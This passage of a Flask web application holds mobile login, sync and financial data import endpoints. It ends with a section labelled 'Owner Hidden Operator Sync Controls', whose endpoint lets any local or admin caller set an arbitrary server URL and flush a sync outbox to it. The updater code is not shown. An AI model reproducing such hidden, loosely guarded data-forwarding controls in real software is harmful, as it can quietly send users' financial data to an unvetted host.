        "user": {"id": uid, "name": name, "email": email},
        "settings": settings(),
    }), 201


@app.route("/api/v1/auth/login", methods=["POST", "OPTIONS"])
def api_v1_login():
    if request.method == "OPTIONS":
        return ("", 204)
    data = request.get_json(silent=True) or {}
    email = str(data.get("email", "")).strip().lower()
    password = str(data.get("password", ""))
    platform = str(data.get("platform", "mobile")).strip()[:40] or "mobile"
    conn = connect()
    user = conn.execute(
        "SELECT * FROM users WHERE email=? AND role='user' AND status='active'",
        (email,),
    ).fetchone()
    if not user or not check_password_hash(user["password_hash"], password):
        conn.close()
        return jsonify({"ok": False, "error": "Invalid email or password."}), 401
    conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), user["id"]))
    conn.commit()
    conn.close()
    audit("user_login", f"{email} [{platform}]", user_id=user["id"])
    return jsonify({
        "ok": True,
        "token": _issue_api_token(user),
        "user": {"id": user["id"], "name": user["name"], "email": user["email"]},
        "settings": settings(),
    }), 200


@app.route("/api/v1/sync/status", methods=["GET", "OPTIONS"])
def api_v1_sync_status():
    if request.method == "OPTIONS":
        return ("", 204)
    api_user, err_resp = _verify_api_user()
    if err_resp:
        return err_resp
    conn = connect()
    ws = conn.execute("SELECT id, name FROM workspaces WHERE owner_user_id=? ORDER BY id LIMIT 1", (api_user["id"],)).fetchone()
    ws_id_val = ws["id"] if ws else None
    datasets_cnt = 0
    records_cnt = 0
    if ws_id_val is not None:
        datasets_cnt = conn.execute("SELECT COUNT(*) FROM imports WHERE workspace_id=?", (ws_id_val,)).fetchone()[0]
        records_cnt = conn.execute("SELECT COUNT(*) FROM financial_transactions WHERE workspace_id=?", (ws_id_val,)).fetchone()[0]
    conn.close()
    return jsonify({
        "ok": True,
        "user": {"id": api_user["id"], "name": api_user["name"], "email": api_user["email"]},
        "datasets": datasets_cnt,
        "records": records_cnt,
        "settings": settings(),
    })


@app.route("/api/v1/sync/import", methods=["POST", "OPTIONS"])
def api_v1_sync_import():
    if request.method == "OPTIONS":
        return ("", 204)
    api_user, err_resp = _verify_api_user()
    if err_resp:
        return err_resp
    payload = request.get_json(silent=True) or {}
    rows = payload.get("rows")
    if not isinstance(rows, list) or not rows:
        return jsonify({"ok": False, "error": "Provide a non-empty rows list."}), 400
    if len(rows) > 25000:
        return jsonify({"ok": False, "error": "Batch exceeds 25,000 rows limit."}), 413

    from werkzeug.utils import secure_filename

    raw_name = str(payload.get("filename") or "mobile_dataset.csv").strip()
    filename = secure_filename(raw_name) or "mobile_dataset.csv"
    client_import_id = str(payload.get("client_import_id") or "").strip()[:120]
    platform = str(payload.get("platform") or "mobile").strip()[:40] or "mobile"

    conn = connect()
    ws = conn.execute("SELECT id FROM workspaces WHERE owner_user_id=? ORDER BY id LIMIT 1", (api_user["id"],)).fetchone()
    if not ws:
        cur = conn.execute(
            "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
            (api_user["id"], f"{api_user['name']}'s workspace", datetime.utcnow().isoformat()),
        )
        conn.commit()
        ws_id_val = cur.lastrowid
    else:
        ws_id_val = ws["id"]

    if client_import_id:
        existing_imports = conn.execute(
            "SELECT id, quality_json FROM imports WHERE workspace_id=? ORDER BY id DESC LIMIT 100",
            (ws_id_val,),
        ).fetchall()
        for imp in existing_imports:
            try:
                qmeta = json.loads(imp["quality_json"] or "{}")
                if qmeta.get("client_import_id") == client_import_id:
                    conn.close()
                    return jsonify({"ok": True, "duplicate": True, "import_id": imp["id"]}), 200
            except Exception:
                continue
    conn.close()

    normalized_input = []
    for r in rows:
        if not isinstance(r, dict):
            continue
        item = dict(r)
        if not item.get("date") and item.get("txn_date"):
            item["date"] = item["txn_date"]
        normalized_input.append(item)

    frame = pd.DataFrame(normalized_input)
    if frame.empty:
        return jsonify({"ok": False, "error": "No valid rows found in payload."}), 400
    mapping = detect(frame.columns)
    report = quality_report(frame, mapping)
    if report["missing_required"]:
        return jsonify({"ok": False, "error": "Missing required fields: " + ", ".join(report["missing_required"])}), 400
    cleaned, excluded = normalize(frame, mapping)
    if cleaned.empty:
        return jsonify({"ok": False, "error": "All rows failed validation."}), 400
    if client_import_id:
        report["client_import_id"] = client_import_id
    report["sync_platform"] = platform
    import_id = persist(cleaned, filename, report, excluded, ws_id_val)
    audit("dataset_imported", f"{filename} [{platform}]", user_id=api_user["id"])
    return jsonify({
        "ok": True,
        "import_id": import_id,
        "rows_imported": int(len(cleaned)),
        "excluded": int(excluded),
    }), 201


# ---------------------------------------------------------------------------
# Desktop In-App Updater & Owner Hidden Operator Sync Controls
# ---------------------------------------------------------------------------

def _can_manage_local_system():
    return _is_loopback_request() or bool(g.user and g.user["role"] == "admin")


@app.route("/api/system/update-status", methods=["GET"])
def system_update_status():
    return jsonify(updater.get_update_status())


@app.route("/api/system/check-updates", methods=["POST"])
def system_check_updates():
    if not _can_manage_local_system():
        abort(403)
    return jsonify(updater.check_for_updates(timeout=6.0))


@app.route("/api/system/download-update", methods=["POST"])
def system_download_update():
    if not _can_manage_local_system():
        abort(403)
    return jsonify(updater.download_desktop_update())


@app.route("/api/system/open-download", methods=["POST"])
def system_open_download():
    if not _can_manage_local_system():
        abort(403)
    ok, msg = updater.reveal_downloaded_update()
    return jsonify({"ok": ok, "message": msg}), (200 if ok else 400)


@app.route("/api/system/operator-sync", methods=["GET", "POST"])
def system_operator_sync():
    if not _can_manage_local_system():
        abort(403)
    if request.method == "POST":
        payload = request.get_json(silent=True) or {}
        action = str(payload.get("action") or "save_override").strip()
        if action == "clear_override":
            updater.set_sync_override("")
        elif action == "flush_now":
            updater.check_for_updates(timeout=4.0)
            updater.flush_sync_outbox(server_port=_local_server_port())
        else:
            ok, normalized = updater.set_sync_override(str(payload.get("url") or ""))
            if not ok:
                return jsonify({"ok": False, "error": "Enter a valid http:// or https:// server URL."}), 400
            if normalized:
                updater.flush_sync_outbox(server_port=_local_server_port())
        return jsonify({"ok": True, **updater.get_sync_config()})
    return jsonify({"ok": True, **updater.get_sync_config()})


@app.errorhandler(403)
def forbidden(e):
    return render_template("error.html", title="Access denied", message="You do not have permission to access this portal.", portal="user"), 403


@app.errorhandler(413)
def too_large(e):
    flash("File is too large (maximum 16 MB).", "error")
    return redirect(url_for("user_data"))


if __name__ == "__main__":
    app.run(debug=False)
